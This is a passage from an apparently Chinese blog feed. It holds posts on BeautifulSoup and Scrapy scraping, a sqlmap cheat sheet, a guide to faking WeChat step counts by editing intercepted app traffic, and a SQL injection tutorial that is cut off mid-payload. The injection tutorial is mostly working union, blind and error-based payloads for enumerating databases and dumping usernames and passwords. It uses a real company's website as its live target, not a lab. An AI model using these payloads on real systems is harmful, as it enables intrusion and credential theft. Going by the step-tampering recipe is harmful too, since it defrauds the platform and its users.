class="line">print(child)<span class="comment">#遍历body标签儿子节点</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.descendants:</span><br><span class="line">    print(child)<span class="comment">#遍历子孙节点</span></span><br></pre></td></tr></table></figure><h4 id="标签树的上行遍历"><a href="#标签树的上行遍历" class="headerlink" title="标签树的上行遍历"></a>标签树的上行遍历</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.parent</td><td>节点的<strong>父亲标签</strong></td></tr><tr><td>.parents</td><td>节点先辈标签的迭代类型，<strong>用于循环遍历先辈节点</strong></td></tr></tbody></table><p><strong>打印soup的a标签的所有先辈：</strong></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580896090674.png"  alt="1580896090674"></p><h4 id="标签树的平行遍历"><a href="#标签树的平行遍历" class="headerlink" title="标签树的平行遍历"></a>标签树的平行遍历</h4><p><strong>平行遍历发生在同一个父节点下的各节点间</strong></p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.next_sibling</td><td>返回按照HTML文本顺序的<strong>下一个平行节点标签</strong></td></tr><tr><td>.previous_sibling</td><td>返回按照HTML文本顺序的<strong>上一个平行节点的标签</strong></td></tr><tr><td>.net_sibling</td><td>迭代类型，返回按照HTML文本顺序的<strong>后续所有平行节点标签</strong></td></tr><tr><td>.previous_sibling</td><td>迭代类型，返回按照HTML文本顺序的<strong>前续所有平行节点标签</strong></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next_siblings:</span><br><span class="line">    print(sibling)<span class="comment">#遍历后续平行节点</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.previous_sibling:</span><br><span class="line">print(sibling)<span class="comment">#遍历前续平行节点</span></span><br></pre></td></tr></table></figure><h3 id="基于bs4库的HTML格式化和编码"><a href="#基于bs4库的HTML格式化和编码" class="headerlink" title="基于bs4库的HTML格式化和编码"></a>基于bs4库的HTML格式化和编码</h3><h4 id="prettify-方法"><a href="#prettify-方法" class="headerlink" title="prettify()方法"></a>prettify()方法</h4><p><strong>.prettify()方法在每个标签后面加了个换行符/n</strong> </p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580897477605.png"  alt="1580897477605"></p><h3 id="基于bs4库的HTML内容查找方法"><a href="#基于bs4库的HTML内容查找方法" class="headerlink" title="基于bs4库的HTML内容查找方法"></a>基于bs4库的HTML内容查找方法</h3><h4 id="find-all-name-attrs-recursive-string-kwargs"><a href="#find-all-name-attrs-recursive-string-kwargs" class="headerlink" title=".find_all(name, attrs, recursive, string, **kwargs)"></a><strong>.find_all(name, attrs, recursive, string, **</strong>kwargs)</h4><p>返回一个列表类型，存储查找的结果</p><ul><li>name：<strong>对标签名称的检索字符串</strong></li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580903655700.png"  alt="1580903655700"></p><ul><li>attres：<strong>对标签属性值的检索字符串</strong>，可标注属性检索</li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580903818840.png"  alt="1580903818840"></p><ul><li>recursive：<strong>是否对子孙全部检索</strong>，默认True</li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580903958598.png"  alt="1580903958598"></p><ul><li>string：&lt;&gt;…&lt;/&gt;中字符串区域的检索字符串</li></ul><p>​    <img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580904150761.png"  alt="1580904150761"></p><h4 id="扩展方法"><a href="#扩展方法" class="headerlink" title="扩展方法"></a>扩展方法</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>&lt;&gt;.find()</td><td>搜索且<strong>只返回一个结果，字符串类型</strong>，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find()_parents()</td><td>在<strong>先辈节点搜索，返回列表类型</strong>，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find()_parent()</td><td>在<strong>先辈节点返回一个结果，字符串类型</strong>，同.find()参数</td></tr><tr><td>&lt;&gt;.find()_next_siblings()</td><td>在<strong>后续平行节点中搜索，返回列表类型</strong>，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find()_next_sibling()</td><td>在<strong>后续平行节点中返回一个结果，字符串类型</strong>，同.find()参数</td></tr><tr><td>&lt;&gt;.find()_previous_siblings()</td><td>在<strong>前序平行节点中搜素，返回列表类型</strong>，同.find()_all参数</td></tr><tr><td>&lt;&gt;.find()_previous_sibling()</td><td>在<strong>前序平行节点中返回一个结果，字符串类型</strong>，同.find()参数</td></tr></tbody></table><h3 id="实例：“中国大学排名定向爬虫”"><a href="#实例：“中国大学排名定向爬虫”" class="headerlink" title="实例：“中国大学排名定向爬虫”"></a>实例：“中国大学排名定向爬虫”</h3><p>中国大学排名：</p><p><a href="http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html" target="_blank" rel="noopener">http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html</a></p><p><strong>功能描述</strong></p><ul><li>输入：大学排名URL链接</li><li>输出：大学排名信息的屏幕输出（排名，大学名称，总分）</li><li>技术路线：requests-bs4</li><li>定向爬虫：仅对输入URL进行爬取，不扩展爬取</li></ul><p><strong>程序的结构设计</strong></p><ul><li>步骤1：从网络上获取大学排名网页内容 getHTMLText()</li><li>步骤2：提取网页内容中信息到合适的数据结构 fillUnivList()</li><li>步骤3：利用数据结构展示并输出结果 printUnivList()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url, timeout = <span class="number">30</span>)</span><br><span class="line">r.raise_for_status()</span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line"><span class="keyword">return</span> r.text</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:<span class="comment">#find查找tbody标签，children循环遍历儿子节点</span></span><br><span class="line"><span class="keyword">if</span> isinstance(tr,bs4.element.Tag):<span class="comment">#判断tr是否是类bs4.element.Tag的对象</span></span><br><span class="line">tds  = tr(<span class="string">'td'</span>)</span><br><span class="line">ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">2</span>].string])<span class="comment">#.string：&lt;&gt;...&lt;/&gt;中字符串区域的检索字符串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">tplt = <span class="string">"&#123;0:^10&#125;\t&#123;1:&#123;3&#125;^10&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>,chr(<span class="number">12288</span>)))<span class="comment">#chr(12288)中文空格填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">u=ulist[i]</span><br><span class="line">print(tplt.format(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>],chr(<span class="number">12288</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">unifo = []</span><br><span class="line">url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html'</span></span><br><span class="line">html = getHTMLText(url)</span><br><span class="line">fillUnivList(unifo, html)</span><br><span class="line">printUnivList(unifo, <span class="number">20</span>)<span class="comment">#20 univs</span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫框架—CrawlSpider</title>
      <link href="/2020/04/27/CrawlSpider%E7%88%AC%E8%99%AB/"/>
      <url>/2020/04/27/CrawlSpider%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h1><p>只要满足某个条件的url，都进行爬取。CrawlSpider 继承自 Spider，只不过是在之前的基础上增加了新的功能，可以定义爬取的url的规则，以后scrapy碰到满足条件的url都进行爬取，而不用 yield Request。</p><h2 id="CrawlSpider爬虫"><a href="#CrawlSpider爬虫" class="headerlink" title="CrawlSpider爬虫"></a>CrawlSpider爬虫</h2><h3 id="创建CrawlSpider爬虫"><a href="#创建CrawlSpider爬虫" class="headerlink" title="创建CrawlSpider爬虫"></a>创建CrawlSpider爬虫</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider -c crawl [爬虫名字] [域名]</span><br><span class="line"></span><br><span class="line">-c crawl：以crawl的模板创建</span><br></pre></td></tr></table></figure><h3 id="LinkExtractors链接提取器"><a href="#LinkExtractors链接提取器" class="headerlink" title="LinkExtractors链接提取器"></a>LinkExtractors链接提取器</h3><p>使用LinkExtractors可以不用程序员自己提取想要的url，然后发送请求。这些工作LinkExtractors可以完成，它会在所有爬虫的页面中找到满足规则的url，实现自动的爬取。以下对LinkExtractors类做简单的介绍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">scrapy</span>.<span class="title">linkextractors</span>.<span class="title">LinkExtractor</span><span class="params">(</span></span></span><br><span class="line"><span class="class"><span class="params">allow = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    deny = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    allow_domains = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    deny_domains = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    deny_extensions = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    restrict_xpaths = <span class="params">()</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    tags = <span class="params">(<span class="string">'a'</span>,<span class="string">'area'</span>)</span>,</span></span></span><br><span class="line"><span class="class"><span class="params">    canonicalize = True,</span></span></span><br><span class="line"><span class="class"><span class="params">    unique = True,</span></span></span><br><span class="line"><span class="class"><span class="params">    process_value = None</span></span></span><br><span class="line"><span class="class"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>主要参数讲解：</p><ul><li>allow：允许的url。所有满足这个正则表达式的url都会被提取。</li><li>deny：禁止的url。所有满足这个正则表达式的url都不会被提取。</li><li>allow_domains：允许的域名。只有在这个里面指定的域名的url才会被提取。</li><li>deny_domains：禁止的域名。所有在这个里面指定的域名的url都不会被提取。</li><li>restrict_xpaths：严格的xpath。和allow共同过滤连接。</li></ul><h3 id="Rule规则类"><a href="#Rule规则类" class="headerlink" title="Rule规则类"></a>Rule规则类</h3><p>定义爬虫的规则类。一下对Rule类做简单的介绍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">scrapy</span>.<span class="title">spiders</span>.<span class="title">Rule</span><span class="params">(</span></span></span><br><span class="line"><span class="class"><span class="params">link_extractor,</span></span></span><br><span class="line"><span class="class"><span class="params">    callback = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    cb_kwargs = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    follow = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    process_links = None,</span></span></span><br><span class="line"><span class="class"><span class="params">    process_request = None</span></span></span><br><span class="line"><span class="class"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>主要参数讲解：</p><ul><li>link_extractor：一个 LinkExtractor 对象，用于定义爬虫规则。</li><li>callback：满足这个规则的url，应该要执行哪个回调函数。因为CrawlSpider 使用了 parse 作为回调函数，因此不要覆盖 parse 作为回调函数自己的回调函数。</li><li>follow：指定根据该规则从 response 中提取的链接是否需要跟进。</li><li>process_links：从  link_extractor 中获取到链接后会传递这个函数，用来过滤不需要爬取的链接。</li></ul>]]></content>
      
      
      <categories>
          
          <category> python - Scrapy爬虫框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python - Scrapy爬虫框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap自动化注入</title>
      <link href="/2020/04/27/sqlmap/"/>
      <url>/2020/04/27/sqlmap/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap自动化注入"><a href="#sqlmap自动化注入" class="headerlink" title="sqlmap自动化注入"></a>sqlmap自动化注入</h2><p>–batch：中间避免手动输入y来确认，自动化完成</p><p>–users:    所有用户</p><p>–current-user：当前用户</p><p>–dbs：所有数据库</p><p>–current-db：当前数据库</p><p>-D “database_name” –tables：查看当前数据库的表</p><p>-D “database_name” -T “table_name” –columns：查看当前数据库的数据表的列</p><p>–dump-all：存储所有数据库</p><p>–dump-all –exclude-sysdbs：存储除系统库外的所有数据库</p><p>-D ”database_name“ -T “table_name” –dump：存储当前数据库的数据表</p><p>-D ”database_name“ -T “table_name” -C “username,password” –dump：存储当前数据的数据表的列的用户名和密码</p><p>-g</p><p>-hh</p><p>-u：url的缩写代表测试后面的网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1   查看页面有没有注入点</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --dbs   爆出所有数据库</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --current-db --current-use</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --tables -D security   爆security数据库的表</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --columns -T users -D security  爆security数据库的users的表里面的列</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --dump -C password,username -T users -D security</span><br><span class="line">  爆security数据库的users的表里面的列的password,username数据信息</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信运动步数修改</title>
      <link href="/2020/04/27/%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E6%AD%A5%E6%95%B0%E4%BF%AE%E6%94%B9/"/>
      <url>/2020/04/27/%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E6%AD%A5%E6%95%B0%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="微信运动步数修改"><a href="#微信运动步数修改" class="headerlink" title="微信运动步数修改"></a>微信运动步数修改</h1><p>第一步：下载乐心健康app</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement1.jpg"  alt="Wechatm_ovement1"></p><p>第二步：注册登陆账号</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement2.jpg"  alt="Wechatm_ovement2"></p><p>第三歩：同步第三方数据（同步微信和支付宝的数据）</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement3.jpg"  alt="Wechatm_ovement3"></p><p>第四步：设置手机代理与抓包工具的代理相同</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement4.jpg"  alt="Wechatm_ovement4"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement5.jpg"  alt="Wechatm_ovement5"></p><p>第六步：开启抓包工具，点击乐心健康app（随便点击），观察抓取数据信息。摇晃手机，观察抓去数据是否有步数更新的信息，然后到repeater中修改步数信息。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement6.jpg"  alt="Wechatm_ovement6"></p>]]></content>
      
      
      <categories>
          
          <category> 微信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信运动步数修改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联合查询注入以及报错注入</title>
      <link href="/2020/04/27/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/04/27/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a><strong>联合查询注入</strong></h1><h2 id="联合查询union"><a href="#联合查询union" class="headerlink" title="联合查询union"></a>联合查询union</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,password from mysql.user;//查询mysql.user表中的user，password字段</span><br><span class="line">mysql&gt; select user_login,user_pass from wordpress.wp_user;//查询wordpress.wp_user表中的user_login和user_pass字段</span><br><span class="line"></span><br><span class="line"><span class="comment">#联合查询</span></span><br><span class="line">mysql&gt; select user,password from mysql.user union select user_login,user_pass from wordpress.wp_user;</span><br><span class="line">注意：union查询前后字段数必须相同</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">前面的字段写死如何使后面字段成立</span><br><span class="line">mysql&gt; select * from dvwa.users</span><br><span class="line">-&gt; union</span><br><span class="line">-&gt; select user_login,user_pass from wordpress.wp_user;</span><br><span class="line">ERROR 1222 (2100): The used <span class="keyword">SELECT</span> statements have a different <span class="built_in">number</span> <span class="keyword">of</span> <span class="keyword">columns</span></span><br><span class="line"></span><br><span class="line">方法：猜字段数,直到不在出现出错误提示</span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> dvwa.users <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line">mysql&gt; select * from dvwa.users union select 1,2;</span><br><span class="line">mysql&gt; select * from dvwa.users union select 1,2,3;</span><br><span class="line">...</span><br><span class="line">mysql&gt; select * from dvwa.users union select 1,2,3,4,5,6;</span><br><span class="line"></span><br><span class="line"><span class="comment">#联合查询</span></span><br><span class="line">mysql&gt; select * from dvwa.users union select user_login,user_pass,1,2,3,4 from wordpress.wp_user;</span><br></pre></td></tr></table></figure><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p>information_schema数据库保存所以数据库信息是<strong>数据库字典</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">==== 查询数据库库名、表名 information_schema.tables ====</span><br><span class="line">mysql&gt; select *form information_schema.TABLES\G//查询来自 TABLES 表的所有信息</span><br><span class="line">mysql&gt; select DISTINCT TABEL_SCHEMA from information_schema.tables;//等价于show databases，DISTINCT 表示对后面的所有参数的拼接取不重复的记录，相当于把 SELECT 表达式的项拼接起来选唯一值。</span><br><span class="line">mysql&gt; select TALE_SHCHEMA,TABLE_NAME from information_schema.TABLES\G;</span><br><span class="line">mysql&gt; select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G;//group_concat()将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</span><br><span class="line">mysql&gt; select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='dvwa';//等价于show tables，查询库名为dvwa来自information_schema数据库中的TABLES表中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==== 查询数据库库名、表名、字段名 information_schema.columns ====</span><br><span class="line">mysql&gt; select *form information_schema.columns\G//查询列的所有信息</span><br><span class="line">mysql&gt; select column_name from information_schema.columns;//查询列的名字</span><br><span class="line">mysql&gt; select column_name from information_schema.columns where table_schema='dvwa' and table_name='users';//查询dvwa数据库中users表中 列的名字</span><br><span class="line">mysql&gt; select column_name from information_schema.columns where table_name='USER_PRIVILEGES'//查询用户的权限表</span><br><span class="line">mysql&gt; select column_name from information_schema.columns where table_name='SCHEMA_PRIVILEGES'//查询SCHEMA的权限表</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><code>id=1&#39;  and sleep(5) --+</code></p><h2 id="联合注入流程"><a href="#联合注入流程" class="headerlink" title="联合注入流程"></a>联合注入流程</h2><p>一、找页面可能存在的注入点的位置**</p><ol><li><p>看页面URL地址是否有后台传参动作</p></li><li><p>构造传参值</p><p>?id=52’（注意所有输入必须是英文输入法）</p></li><li><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>and    1=1    判断页面是否正常</p><p>and    1=2    判断页面是否部分报错</p></li><li><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>order by（值）找到报错和不报错的邻接点，取不报错的最大值</p><p>（9报错8不报错，证明当前页面有8个显示位）</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581235574212.png"  alt="1581235574212"></p></li><li><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>union select 1,2,3,4,5,6,7,8 –+ （–+指注释掉我们插入攻击语句后所有代码）（匹配order by验证出来的列数）</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581235846419.png"  alt="1581235846419"></p></li><li><p>可以判断当前URL地址为注入点</p><p>在占位符的位置上，构造我们想要的攻击代码。</p><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>union select 1,2,3,4,5,6,构造攻击语句,8 –+</p><p>database()    查看当前页面使用的数据库</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581235983929.png"  alt="1581235983929"></p><p>user()    查看当前登录数据库的用户</p><p>@@version    查看当前数据库版本</p><p>@@basedir    查看路径</p></li><li><p>爆库 查看当前数据库中有哪些数据表</p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=0xsecurity</code></p><p>#注意：group_concat()是将返回的数据当做一行输出，security的十六进制7365637572697479</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581236203290.png"  alt="1581236203290"></p><p><img src="/" class="lazyload" data-src="C:%5CUsers%5CShinelon%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581236228119.png"  alt="1581236228119"></p></li><li><p>爆表 查看当前数据报哪个看起来像存放关键信息，查看当前表列</p><p><code>select group_concat(column_name) from information_schema.columns where table_schema=0xsecurity and table_name=0xusers</code></p><p>#注意：users的十六进制7573657273</p><p><img src="/" class="lazyload" data-src="C:%5CUsers%5CShinelon%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581236437856.png"  alt="1581236437856"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581236461442.png"  alt="1581236461442"></p></li><li><p>爆数据 ID USER PWD等</p><p><code>select group_concat(concat(username,&#39;%20&#39;,password)) from users</code>    %20~%25 url编码</p></li></ol><p>‘    ‘     LIMIT 0,1    ‘ </p><p> ‘      ‘    –  LIMIT 0,1    ‘</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581236540024.png"  alt="1581236540024"></p><p><img src="/" class="lazyload" data-src="C:%5CUsers%5CShinelon%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581236559664.png"  alt="1581236559664"></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="group-by-重复键冲突"><a href="#group-by-重复键冲突" class="headerlink" title="group by 重复键冲突"></a>group by 重复键冲突</h2><p>公式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1 and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span>查询的内容 <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure><p>提交参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">version</span>() <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure><h2 id="extractvalue（）-函数"><a href="#extractvalue（）-函数" class="headerlink" title="extractvalue（） 函数"></a>extractvalue（） 函数</h2><p>公式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1 and 